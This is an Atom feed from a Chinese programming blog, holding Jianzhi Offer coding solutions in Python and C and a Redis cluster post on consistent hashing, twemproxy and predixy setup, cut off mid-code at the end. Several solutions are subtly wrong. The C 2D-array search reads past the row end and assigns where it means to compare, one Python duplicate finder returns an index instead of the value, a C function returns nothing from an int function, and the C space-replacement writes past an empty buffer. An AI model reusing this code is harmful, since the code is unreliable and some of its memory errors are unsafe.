    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请实现一个函数，把字符串 s 中的每个空格替换成”%20”。</p><a id="more"></a><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; &quot;We are happy.&quot;</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;We%20are%20happy.&quot;</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><code>0 &lt;= s 的长度 &lt;= 10000</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字符串转列表判断完再拼成字符串</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">replaceSpace</span><span class="params">(self, s: str)</span> -&gt; str:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        lst = list(s)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(lst)):</span><br><span class="line">            <span class="keyword">if</span> lst[i] == <span class="string">' '</span>:</span><br><span class="line">                lst[i] = <span class="string">'%20'</span></span><br><span class="line">        s = <span class="string">''</span>.join(lst)</span><br><span class="line">        <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">replaceSpace</span><span class="params">(<span class="keyword">char</span>* s)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* str = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(s)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>*));</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (s[i] == <span class="string">' '</span>)</span><br><span class="line">&#123;</span><br><span class="line">str[j++] = <span class="string">'%'</span>;</span><br><span class="line">str[j++] = <span class="string">'2'</span>;</span><br><span class="line">str[j++] = <span class="string">'0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">str[j++] = s[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    str[j]=<span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请实现一个函数，把字符串 s 中的每个空格替换成”%20”。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>02二维数组中的查找</title>
    <link href="http://yoursite.com/2020/02/18/02%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/"/>
    <id>http://yoursite.com/2020/02/18/02%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/</id>
    <published>2020-02-18T10:01:43.000Z</published>
    <updated>2020-02-19T11:15:24.425Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><a id="more"></a><p><strong>示例:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">现有矩阵 matrix 如下：</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  [1,   4,  7, 11, 15],</span><br><span class="line">  [2,   5,  8, 12, 19],</span><br><span class="line">  [3,   6,  9, 16, 22],</span><br><span class="line">  [10, 13, 14, 17, 24],</span><br><span class="line">  [18, 21, 23, 26, 30]</span><br><span class="line">]</span><br><span class="line">给定 target &#x3D; 5，返回 true。</span><br><span class="line"></span><br><span class="line">给定 target &#x3D; 20，返回 false。</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><p><code>0 &lt;= n &lt;= 1000</code></p></li><li><p><code>0 &lt;= m &lt;= 1000</code></p></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上下都有序，可以从第一排的最后一个开始比较，如果大于它说明大于整个第一排的元素，行指针加1，直到比较到一个小于的，再列指针减少，到最小仍未匹配说明不存在</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNumberIn2DArray</span><span class="params">(self, matrix, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type matrix: List[List[int]]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> matrix==[]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        i,j=[<span class="number">0</span>,len(matrix[<span class="number">0</span>])<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">while</span> i &lt; len(matrix) <span class="keyword">and</span> j&gt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> matrix[i][j]==target:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> target &gt; matrix[i][j]:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#测试用例有一个[]和[[]]，需要特殊化处理；或者先判断长度</span></span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">findNumberIn2DArray</span><span class="params">(<span class="keyword">int</span>** matrix, <span class="keyword">int</span> matrixSize, <span class="keyword">int</span>* matrixColSize, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> j = *matrixColSize;</span><br><span class="line"><span class="keyword">if</span> (matrixSize==<span class="number">0</span>||matrix==<span class="literal">NULL</span>||matrixColSize==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (i&lt;matrixSize&amp;&amp;j&gt;=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (matrix[i][j]=target)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(matrix[i][j]&lt;target)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>01数组中重复的数字</title>
    <link href="http://yoursite.com/2020/02/18/01%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/"/>
    <id>http://yoursite.com/2020/02/18/01%E6%95%B0%E7%BB%84%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0%E5%AD%97/</id>
    <published>2020-02-18T09:59:43.000Z</published>
    <updated>2020-02-19T11:15:38.535Z</updated>
    
    <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>找出数组中重复的数字。</p><a id="more"></a><p>在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。</p><p><strong>示例 1：</strong></p><p><strong>输入：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[2, 3, 1, 0, 2, 5, 3]</span><br></pre></td></tr></table></figure><p><strong>输出：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 或 3</span><br></pre></td></tr></table></figure><p><strong>限制：</strong></p><ul><li><code>2 &lt;= n &lt;= 100000</code></li></ul><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#标记已出现的数字个数，并同时判断</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findRepeatNumber</span><span class="params">(self, nums:List[int])</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        arr=[<span class="number">0</span>]*len(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            arr[nums[i]]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(arr[nums[i]]&gt;<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="comment">#优化：使用字典</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findRepeatNumber</span><span class="params">(self, nums:List[int])</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        repeatDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> repeatDict:</span><br><span class="line">                repeatDict[num] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> num</span><br><span class="line">        </span><br><span class="line"><span class="comment">#优化：原地hash</span></span><br><span class="line"><span class="comment">#如果num[i]的值和以num[i]为下标的值相等，那么就出现过，如果不相等就元素互换</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findRepeatNumber</span><span class="params">(self, nums: List[int])</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">while</span> i != nums[i]:</span><br><span class="line">                <span class="keyword">if</span> nums[i] == nums[nums[i]]:</span><br><span class="line">                    <span class="keyword">return</span> nums[i]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nums[nums[i]], nums[i] = nums[i], nums[nums[i]]</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原地hash</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findRepeatNumber</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numsSize ; i++)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=nums[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == nums[nums[i]])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[i];</span><br><span class="line">                nums[i] = nums[nums[i]];</span><br><span class="line">                nums[temp] = temp;<span class="comment">//此处是坑点，第一次没发现nums[i]已经变了，不能正常交换</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;找出数组中重复的数字。&lt;/p&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="http://yoursite.com/categories/%E5%89%91%E6%8C%87offer/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis(6)-集群</title>
    <link href="http://yoursite.com/2020/02/14/Redis-6-%E9%9B%86%E7%BE%A4/"/>
    <id>http://yoursite.com/2020/02/14/Redis-6-%E9%9B%86%E7%BE%A4/</id>
    <published>2020-02-14T08:27:10.000Z</published>
    <updated>2020-02-19T02:12:36.044Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一致性hash"><a href="#一致性hash" class="headerlink" title="一致性hash"></a>一致性hash</h3><p>考虑一种场景：现在后端有多个redis服务器提供<strong>缓存</strong>功能，客户端向redis写时想要实现在不同的redis服务器中写，从而使得redis服务器的压力减少，这里就需要算法来将数据映射到某个redis服务器上，从而引出一致性hash算法。</p><a id="more"></a><p>一致性hash是在0~2^32次方之间进行映射，将每个物理节点按照该算法映射到一个逻辑圆上，有数据到达时将数据也hash，然后也会映射到逻辑圆上，然后顺时针找一个最近的物理节点，将数据存储到该物理节点。</p><p>但是这样会引起一个新的问题，即数据倾斜问题，例如一批数据总是映射到一个分段上，因此会存储到同一个物理节点上，这样该物理节点会有很大的存储压力。为了解决该问题提出了虚拟节点的概念，即将一个物理节点逻辑上分成多份，映射到逻辑圆的其他地方，这样就一定程度上减少数据倾斜现象的出现。</p><h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><p>redis集群就是一个分布式数据库，通过分片机制进行数据分布，集群内的每个节点仅拥有数据库的一部分数据。redis集群是去中心化集群，即客户端访问该集群的任意一个节点都可以获取全部数据。这是因为集群内的每个节点都拥有全局键的元数据表，即如果当前节点没有客户端访问的键时，会将真正的键的位置告诉客户端，客户端程序会自动去真正的节点寻找。</p><p>分片机制就是上面说的hash计算，不过不是一致性hash，采用的是取模运算，只不过这个模数很大(16384)可以方便后续增加。每个数据经过取模运算后会得到一个数，这个数叫做槽位，每个redis服务器存放不同的槽位的数据，并且当有新的redis服务器加入时会将现有的每个redis服务器的一部分槽位进行迁移，当然槽位对应的数据也会迁移。</p><p>集群内部中也需要配置主从，并且内部也是采用哨兵模式，如果有半数节点发现某个异常节点，共同决定更改异常节点的状态，如果改节点是主节点，则对应的从节点自动顶替为主节点，当原先的主节点上线后，则会变为从节点。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="twemproxy"><a href="#twemproxy" class="headerlink" title="twemproxy"></a>twemproxy</h4><h5 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译安装twemproxy</span></span><br><span class="line"><span class="comment">#https://github.com/twitter/twemproxy</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/twitter/twemproxy.git</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">src/nutcracker -h</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建配置文件目录</span></span><br><span class="line">mkdir /etc/nutcracker</span><br><span class="line"><span class="comment">#移动配置文件到该目录下</span></span><br><span class="line">mv ~/soft/twemproxy/twemproxy/conf/nutcracker.* .</span><br><span class="line"><span class="comment">#移动可执行文件</span></span><br><span class="line">mv nutcracker /usr/<span class="built_in">local</span>/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建twemproxy.service</span></span><br><span class="line"><span class="comment">#vim /lib/systemd/system/twemproxy.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=twemproxy Service</span><br><span class="line">After=syslog.target network.target</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/bin/nutcracker -d -c /etc/nutcracker/nutcracker.yml</span><br><span class="line">ExecStop=<span class="built_in">cd</span> /usr/<span class="built_in">local</span>/bin/&amp;&amp;pkill nutcracker</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"><span class="comment">#创建软连接</span></span><br><span class="line">ln -s /lib/systemd/system/twemproxy.Service /etc/systemd/system/multi-user.target.wants/twemproxy</span><br><span class="line"></span><br><span class="line"><span class="comment">#重载</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl <span class="built_in">enable</span> twemproxy</span><br></pre></td></tr></table></figure><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alpha:<span class="comment">#随便一个名字</span></span><br><span class="line">  listen: 0.0.0.0:22121<span class="comment">#监听端口</span></span><br><span class="line">  <span class="built_in">hash</span>: crc16<span class="comment">#hash算法</span></span><br><span class="line">  distribution: ketama<span class="comment">#一致性hash</span></span><br><span class="line">  auto_eject_hosts: <span class="literal">true</span><span class="comment">#用于控制twemproxy是否应该根据server的连接状态重建群集 </span></span><br><span class="line">  backlog: 2048<span class="comment">#TCP的backlog长度</span></span><br><span class="line">  redis: <span class="literal">true</span><span class="comment">#默认代理memcache，设置为true代理redis</span></span><br><span class="line">  server_retry_timeout: 200<span class="comment">#控制服务器连接的时间间隔</span></span><br><span class="line">  server_failure_limit: 1<span class="comment">#控制连接服务器的次数</span></span><br><span class="line">  servers:<span class="comment">#代理的后端服务器ip和端口，1为权重</span></span><br><span class="line">  -127.0.0.1:6379:1</span><br><span class="line">  -127.0.0.1:6380:1</span><br><span class="line">  </span><br><span class="line"><span class="comment">#配置好后重启并使用redis-cli进入22121端口，之后对22121访问即可访问后端主机</span></span><br><span class="line">systemctl restart twemproxy</span><br><span class="line">redis-cli -p 22121</span><br></pre></td></tr></table></figure><h4 id="predixy"><a href="#predixy" class="headerlink" title="predixy"></a>predixy</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/joyieldInc/predixy</span></span><br><span class="line">wget https://github.com/joyieldInc/predixy/releases/download/1.0.5/predixy-1.0.5-bin-amd64-linux.tar.gz</span><br></pre></td></tr></table></figure><h5 id="配置文件-1"><a href="#配置文件-1" class="headerlink" title="配置文件"></a>配置文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#详情见https://github.com/joyieldInc/predixy/blob/master/doc/config_CN.md</span></span><br><span class="line"><span class="comment">#通用</span></span><br><span class="line">Name<span class="comment">#定义名称</span></span><br><span class="line">Bind 0.0.0.0:7617<span class="comment">#定义端口和地址，也可以使用socket</span></span><br><span class="line">WorkerThreads<span class="comment">#线程数</span></span><br><span class="line">MaxMemory<span class="comment">#最大可使用内存</span></span><br><span class="line">ClientTimeout<span class="comment">#客户端连接超时</span></span><br><span class="line">BufSize<span class="comment">#用于实现零拷贝</span></span><br><span class="line">Log<span class="comment">#日志</span></span><br><span class="line">LogRotate<span class="comment">#日志切分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sentinel实例</span></span><br><span class="line">SentinelServerPool &#123;</span><br><span class="line">    Databases 16</span><br><span class="line">    Hash crc16</span><br><span class="line">    HashTag <span class="string">"&#123;&#125;"</span></span><br><span class="line">    Distribution modula</span><br><span class="line">    MasterReadPriority 60</span><br><span class="line">    StaticSlaveReadPriority 50</span><br><span class="line">    DynamicSlaveReadPriority 50</span><br><span class="line">    RefreshInterval 1</span><br><span class="line">    ServerTimeout 1</span><br><span class="line">    ServerFailureLimit 10</span><br><span class="line">    ServerRetryTimeout 1</span><br><span class="line">    KeepAlive 120</span><br><span class="line">    Sentinels &#123;</span><br><span class="line">        + 10.2.2.2:7500</span><br><span class="line">        + 10.2.2.3:7500</span><br><span class="line">        + 10.2.2.4:7500</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#定义一个redis组，Group的名字应该和redis sentinel里面的名字一致；有几个主从设置几个group</span></span><br><span class="line">    Group shard001 &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    Group shard002 &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#注意</span></span><br><span class="line">多个主从时不能使用事务，只有一个主从时才能使用事务</span><br></pre></td></tr></table></figure><h4 id="redis-cluster"><a href="#redis-cluster" class="headerlink" title="redis-cluster"></a>redis-cluster</h4><p>redis自身的集群已经在源码包里编译过了，实际就是一个脚本命令。该集群去中心化，原理在上面讲过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/root/soft/redis-5.0.7/utils/create-cluster目录下create-cluster脚本，实际是调用redis-cli --cluster</span></span><br><span 